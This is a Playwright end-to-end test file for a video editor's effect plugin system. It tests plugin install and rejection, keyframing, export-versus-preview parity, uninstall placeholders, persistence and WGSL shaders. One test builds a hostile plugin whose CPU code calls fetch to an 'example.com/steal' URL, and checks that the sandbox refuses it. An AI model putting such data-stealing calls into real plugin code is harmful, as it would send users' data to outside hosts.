import { execFileSync } from "node:child_process";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { expect, test, type Page } from "@playwright/test";
import { clickClip, openHookPage, readState, seek, settle, snapStable, clipsOf } from "./helpers";
import { bandMeans, ensureLumetriFixtures, openWithClips } from "./lumetri-basic-lib";
import {
  EXAMPLES,
  OUT,
  closeManager,
  ensurePluginOutDir,
  openManager,
  openManagerFromHook,
  pack,
  packRaw,
  runWgslPluginFlow,
  uploadPlugin,
} from "./effect-plugins-lib";

/**
 * Effect plugin SDK, end to end in a real browser:
 *  - install a .orplugin from a file through Effects > Manage plugins (and reject a broken one),
 *  - apply it from the Effects panel, keyframe a parameter, export, and compare the exported frame
 *    with the preview,
 *  - remove the plugin: the effect stays as a placeholder and the picture falls back; reinstall restores it,
 *  - the WebGPU path (shader compile errors, channel split) when this machine has a WebGPU adapter,
 *    otherwise the documented bypass.
 */

const CARD_SUFFIX = ". Drag onto a clip to apply, or double-click to apply to selected clip.";
const BANDS = 5;

test.beforeAll(() => {
  ensureLumetriFixtures();
  ensurePluginOutDir();
});

/** Mean RGB of vertical bands of a decoded frame of the exported file. */
function bandsOfFrame(mp4: string, t: number, width: number, height: number): Array<[number, number, number]> {
  const buf = execFileSync(
    "ffmpeg",
    ["-v", "error", "-ss", String(t), "-i", mp4, "-frames:v", "1", "-vf", `scale=${width}:${height}`, "-f", "rawvideo", "-pix_fmt", "rgb24", "-"],
    { maxBuffer: 64 * 1024 * 1024 },
  );
  expect(buf.length, `frame decoded from ${mp4}`).toBe(width * height * 3);
  const out: Array<[number, number, number]> = [];
  for (let band = 0; band < BANDS; band++) {
    const x0 = Math.floor((width * band) / BANDS);
    const x1 = Math.floor((width * (band + 1)) / BANDS);
    const sum: [number, number, number] = [0, 0, 0];
    let count = 0;
    for (let y = Math.floor(height * 0.2); y < Math.floor(height * 0.8); y++)
      for (let x = x0; x < x1; x++) {
        const i = (y * width + x) * 3;
        sum[0] += buf[i];
        sum[1] += buf[i + 1];
        sum[2] += buf[i + 2];
        count++;
      }
    out.push([sum[0] / count, sum[1] / count, sum[2] / count]);
  }
  return out;
}

/** Warmth of a band: red minus blue. A grey ramp is 0; the duotone's orange highlights are strongly positive. */
const warmth = (band: [number, number, number]): number => band[0] - band[2];
const maxDelta = (a: Array<[number, number, number]>, b: Array<[number, number, number]>): number =>
  Math.max(...a.flatMap((band, i) => band.map((v, c) => Math.abs(v - b[i][c]))));

async function bandsAt(page: Page, key: string, t: number): Promise<Array<[number, number, number]>> {
  await seek(page, t);
  await snapStable(page, key);
  return (await bandMeans(page, key, BANDS)).bands;
}

async function pluginEffects(page: Page, clipId: string): Promise<Array<{ type: string; params: Record<string, unknown> }>> {
  return page.evaluate((id) => (window as any).__openreelE2E.project.getState().getClip(id).effects, clipId);
}

test("install from file, apply, keyframe, export: the exported frame matches the preview; removing the plugin keeps a placeholder", async ({ page }) => {
  test.setTimeout(600_000);
  const duotone = pack("duotone-map");
  const [clipId] = await openWithClips(page, ["lumetri-gradient.mp4"]);

  // Baseline picture: an untouched grey ramp (no warmth anywhere).
  const baseline = await bandsAt(page, "plugin-base", 1);
  for (const band of baseline) expect(Math.abs(warmth(band))).toBeLessThan(6);

  // A broken package is refused with a readable reason and nothing is installed.
  await openManager(page);
  await uploadPlugin(page, packRaw("broken.orplugin", { "plugin.json": JSON.stringify({ apiVersion: 1, id: "Broken Id", name: "x" }) }), "could not be installed");
  const rejected = page.getByTestId("plugin-install-report");
  await expect(rejected).toHaveAttribute("role", "alert");
  await expect(rejected).toContainText("could not be installed");
  await expect(rejected).toContainText("id must match");
  await expect(page.getByTestId("plugin-empty")).toBeVisible();

  // A package with a network call in its CPU code is refused too (sandbox lint).
  const evil = pack("duotone-map", { "cpu.js": "function process(frame) { fetch('https://example.com/steal'); }" });
  await uploadPlugin(page, evil, 'may not use "fetch"');

  // The real one installs.
  await uploadPlugin(page, duotone, "Installed Duotone Map v1.0.0");
  await expect(page.getByTestId("plugin-row-duotone-map")).toContainText("CPU worker");
  await closeManager(page);

  // Apply it from the Effects panel.
  await clickClip(page, clipId);
  await page.getByRole("button", { name: "Effects", exact: true }).first().click();
  await settle(page, 600);
  await page.getByLabel("Search effects").fill("Duotone");
  const card = page.locator(`button[aria-label="Duotone Map${CARD_SUFFIX}"]`).first();
  await card.scrollIntoViewIfNeeded();
  const before = await readState(page);
  await card.dblclick();
  await expect.poll(async () => clipsOf(await readState(page), "Main")[0].effects, { timeout: 15_000 }).toBe(1);
  const after = await readState(page);
  expect(after.historyLength - before.historyLength, "one undoable step").toBe(1);
  const [effect] = await pluginEffects(page, clipId);
  expect(effect.type).toBe("plugin:duotone-map");
  expect(effect.params.__pluginVersion).toBe("1.0.0");

  // Auto-generated parameter UI.
  await page.getByRole("button", { name: "Edit Duotone Map" }).first().click();
  await expect(page.getByRole("slider", { name: "Intensity" })).toBeVisible({ timeout: 10_000 });
  await expect(page.getByRole("combobox", { name: "Luminance" })).toBeVisible();

  // Keyframe Intensity: 0 at the clip start -> 1 at 2 s (through the clip keyframe store, undoable).
  const kfBefore = (await readState(page)).historyLength;
  await page.evaluate((id) => {
    const store = (window as any).__openreelE2E.project.getState();
    store.updateClipKeyframes(id, [
      { id: "plugin-k1", time: 0, property: "effect.plugin:duotone-map.intensity", value: 0, easing: "linear" },
      { id: "plugin-k2", time: 2, property: "effect.plugin:duotone-map.intensity", value: 1, easing: "linear" },
    ]);
  }, clipId);
  expect((await readState(page)).historyLength).toBe(kfBefore + 1);

  const start = await bandsAt(page, "plugin-start", 0);
  const mid = await bandsAt(page, "plugin-mid", 1);
  const late = await bandsAt(page, "plugin-late", 1.9);
  console.log(`[plugins] warmth start=${start.map((b) => warmth(b).toFixed(0))} mid=${mid.map((b) => warmth(b).toFixed(0))} late=${late.map((b) => warmth(b).toFixed(0))}`);
  // t=0: intensity 0, the picture is the untouched ramp. Later: warmer and warmer.
  expect(maxDelta(start, baseline)).toBeLessThan(4);
  const avgWarmth = (bands: Array<[number, number, number]>) => bands.reduce((n, b) => n + warmth(b), 0) / bands.length;
  expect(avgWarmth(mid)).toBeGreaterThan(avgWarmth(start) + 15);
  expect(avgWarmth(late)).toBeGreaterThan(avgWarmth(mid) + 8);

  // Export, then compare the exported frame at 1 s with the preview at 1 s.
  await seek(page, 0);
  await page.getByRole("button", { name: "Export", exact: true }).first().click();
  await settle(page, 1500);
  const download = page.waitForEvent("download", { timeout: 480_000 });
  await page.getByRole("button", { name: "Export Video" }).last().click();
  const mp4 = join(OUT, "plugin-export.mp4");
  await (await download).saveAs(mp4);
  const exportedMid = bandsOfFrame(mp4, 1, 640, 360);
  const exportedLate = bandsOfFrame(mp4, 1.9, 640, 360);
  const midDelta = maxDelta(mid, exportedMid);
  const lateDelta = maxDelta(late, exportedLate);
  console.log(`[plugins] export parity worst band delta mid=${midDelta.toFixed(2)} late=${lateDelta.toFixed(2)}`);
  expect(midDelta, "exported frame vs preview at the keyframed midpoint").toBeLessThan(10);
  expect(lateDelta, "exported frame vs preview near the end of the keyframe ramp").toBeLessThan(10);
  expect(avgWarmth(exportedMid)).toBeGreaterThan(avgWarmth(start) + 10);

  // Uninstall: the effect, its parameters and keyframes stay; the picture falls back; a placeholder explains why.
  await openManager(page);
  await page.getByRole("button", { name: "Uninstall Duotone Map" }).click();
  await expect(page.getByTestId("plugin-empty")).toBeVisible();
  await closeManager(page);
  const kept = await pluginEffects(page, clipId);
  expect(kept).toHaveLength(1);
  expect(kept[0].type).toBe("plugin:duotone-map");
  expect(kept[0].params.__pluginVersion).toBe("1.0.0");
  const keptKeyframes = await page.evaluate((id) => (window as any).__openreelE2E.project.getState().getClip(id).keyframes.length, clipId);
  expect(keptKeyframes).toBe(2);
  const removed = await bandsAt(page, "plugin-removed", 1);
  expect(maxDelta(removed, baseline), "without the plugin the frame renders unprocessed, not broken").toBeLessThan(4);
  await page.getByRole("button", { name: "Edit duotone-map (plugin missing)" }).first().click();
  await expect(page.getByTestId("plugin-missing-placeholder")).toContainText("is not installed");
  await expect(page.getByTestId("plugin-missing-placeholder")).toContainText("v1.0.0");

  // Reinstall: the same saved effect renders again.
  await openManager(page);
  await uploadPlugin(page, duotone, "Installed Duotone Map v1.0.0");
  await closeManager(page);
  const restored = await bandsAt(page, "plugin-restored", 1);
  expect(maxDelta(restored, mid), "reinstalling restores the exact same frame").toBeLessThan(2);
  await expect(page.getByRole("slider", { name: "Intensity" })).toBeVisible({ timeout: 10_000 });
});

test("plugins persist across a reload (IndexedDB) and upgrades replace the installed version", async ({ page }) => {
  test.setTimeout(120_000);
  await openHookPage(page);
  await openManagerFromHook(page);
  await uploadPlugin(page, pack("duotone-map"), "Installed Duotone Map v1.0.0");
  const upgrade = pack("duotone-map", { "plugin.json": readFileSync(join(EXAMPLES, "duotone-map/plugin.json"), "utf8").replace('"version": "1.0.0"', '"version": "1.1.0"') });
  await uploadPlugin(page, upgrade, "Updated Duotone Map from v1.0.0 to v1.1.0");
  await expect(page.getByTestId("plugin-row-duotone-map")).toHaveCount(1);

  await page.reload();
  await page.waitForFunction(() => Boolean((window as any).__openreelE2E));
  const listed = await page.evaluate(async () => {
    const hook = (window as any).__openreelE2E.plugins;
    await hook.init();
    return hook.registry.list().map((p: any) => `${p.manifest.id}@${p.manifest.version}`);
  });
  expect(listed).toEqual(["duotone-map@1.1.0"]);

  // Clean up so other specs in this browser profile start empty.
  await openManagerFromHook(page);
  await page.getByRole("button", { name: "Uninstall Duotone Map" }).click();
  await expect(page.getByTestId("plugin-empty")).toBeVisible();
});

test("WGSL plugins: compile errors are surfaced, and the shaders really run on the GPU (or are bypassed without WebGPU)", async ({ page }) => {
  test.setTimeout(180_000);
  const { hasAdapter } = await runWgslPluginFlow(page);
  expect(hasAdapter, "the gpu project must run with a WebGPU adapter on this machine").toBe(true);
});
